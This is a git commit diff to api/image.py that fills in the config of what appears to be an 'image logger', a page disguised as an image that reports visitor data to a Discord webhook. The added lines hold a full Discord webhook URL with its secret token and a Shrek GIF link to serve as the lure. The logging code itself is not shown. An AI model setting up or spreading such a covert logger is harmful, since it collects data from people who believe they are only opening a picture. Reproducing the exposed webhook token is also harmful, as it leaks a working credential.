0c83a2fc96167e2f8174b311bb22ef314a7235e7
Truitekifile <91056971+Truitekifile@users.noreply.github.com>
2025-01-31 20:56:04 +0100

    Update image.py

--- api/image.py
+++ api/image.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1334974735892742224/UDdRABNHdRkEIcttDNnX49R4ISVSfZ6h-3OczGpAIX1q2RYO_loWEdq6Vqa4W1yhtEMJ",
+    "image": "https://media.tenor.com/HWZBAtW8_bkAAAAe/marex-pwcca-shrek-mashrek-alderiate.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
